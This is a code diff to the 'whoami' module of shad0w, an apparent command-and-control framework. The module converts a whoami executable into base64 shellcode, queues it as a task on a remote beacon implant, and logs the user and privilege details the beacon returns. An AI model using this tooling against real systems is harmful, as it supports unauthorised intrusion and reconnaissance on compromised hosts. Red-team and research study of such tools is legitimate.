@@ -1,6 +1,8 @@
-# 
+#
 # Get infomation about the current user
 #
+
+import inspect
 
 import json
 import base64
@@ -11,14 +13,12 @@ from lib import shellcode
 __description__ = "Get infomation about the current user the beacon is running as"
 __author__ = "@_batsec_"
 
-# using work around for stager bug
-# EXEC_ID       = 0x4000
-# OPCODE_WHOAMI = 0x7000
-
 TMP_EXEC_ID = 0x3000
 
 ERROR = False
 error_list = ""
+
+current_beacon = None
 
 # let argparse error and exit nice
 def error(message):
@@ -31,9 +31,16 @@ def exit(status=0, message=None):
     return
 
 def whoami_callback(shad0w, data):
+    global current_beacon
+
+    print("WHOAMI CALLBACK")
+    print("calling FUNC:", inspect.stack()[2][3])
+
+    data = data.strip("\r\n")
     if len(data) > 1:
-        print("")
-        shad0w.debug.log(data.strip("\r\n"), log=True, pre=False, end='')
+        if current_beacon is not None:
+            print("ADDING BEACON INFO")
+            shad0w.event.beacon_info(current_beacon, data.strip())
 
     return ""
 
@@ -42,25 +49,23 @@ def get_whoami_args(args):
 
     if args.all:
         return "/all"
-    
+
     if args.groups:
         data += "/groups"
-    
+
     if args.privs:
         data += "/priv"
-    
+
     return data
 
-async def main(shad0w, args):
-    global ERROR
+async def main(shad0w, args, beacon):
+    global ERROR, current_beacon
 
     # save the raw args
     raw_args = args
-    
-    # check we actually have a beacon
-    if shad0w.current_beacon is None:
-        shad0w.debug.error("ERROR: No active beacon")
-        return
+
+    # make beacon global
+    current_beacon = beacon
 
     # usage examples
     usage_examples = """
@@ -72,11 +77,11 @@ whoami --all
 whoami --privs
 whoami --groups
 """
-    
+
     parse = argparse.ArgumentParser(prog='whoami',
                                 formatter_class=argparse.RawDescriptionHelpFormatter,
                                 epilog=usage_examples)
-    
+
     # keep it behaving nice
     parse.exit = exit
     parse.error = error
@@ -99,28 +104,19 @@ whoami --groups
             print(error_list)
             parse.print_help()
             return
-    
+
     # this will change to args to args for whoami
     data = get_whoami_args(args)
 
-    # work around for the stager bug
-    # make the json
-    # data = {"op" : OPCODE_WHOAMI, "args": data}
-    # print(data)
-    # data = json.dumps(data)
-    # set a task for the current beacon to do
-    # shad0w.beacons[shad0w.current_beacon]["callback"] = whoami_callback
-    # shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, data)
-
     # do we have arguments to pass to the function?
     file = "/root/shad0w/bin/whoami.x64.exe"
-
-    # rcode = buildtools.extract_shellcode(beacon_file=file, want_base64=True)
 
     if len(data) != 0:
         rcode = base64.b64encode(shellcode.generate(file, None, data, parse=False)).decode()
     elif len(data) == 0:
         rcode = base64.b64encode(shellcode.generate(file, None, None, parse=False)).decode()
 
-    shad0w.beacons[shad0w.current_beacon]["callback"] = whoami_callback
-    shad0w.beacons[shad0w.current_beacon]["task"] = (TMP_EXEC_ID, rcode)
+    shad0w.beacons[beacon]["callback"] = whoami_callback
+    shad0w.beacons[beacon]["task"] = (TMP_EXEC_ID, rcode)
+
+    print("executed")
